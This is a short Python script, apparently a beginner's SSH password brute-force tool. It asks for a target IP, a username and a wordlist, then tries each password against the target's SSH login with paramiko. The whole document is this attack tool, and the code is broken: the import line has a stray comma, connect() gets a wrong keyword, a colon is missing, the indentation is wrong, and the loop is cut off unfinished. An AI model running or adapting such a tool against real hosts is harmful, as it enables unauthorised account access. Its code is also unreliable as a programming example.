import paramiko, sys, os, socket,

def ssh_connect(passw, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, passw=passw)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

host = input('[+] Enter the IP of target: ')
username = input('[+] Enter the SSH username: ')
wordlist = input('[+] Path to wordlist: ')

if os.path.exists(wordlist) == False:
    print('[!!] Invalid path or wordlist not found. ')
    sys.exit(1)

with open(wordlist, 'r') as file:
    for line in file.readlines()
        passw = line.strip()
            try:
                response = ssh_connect(passw)

                
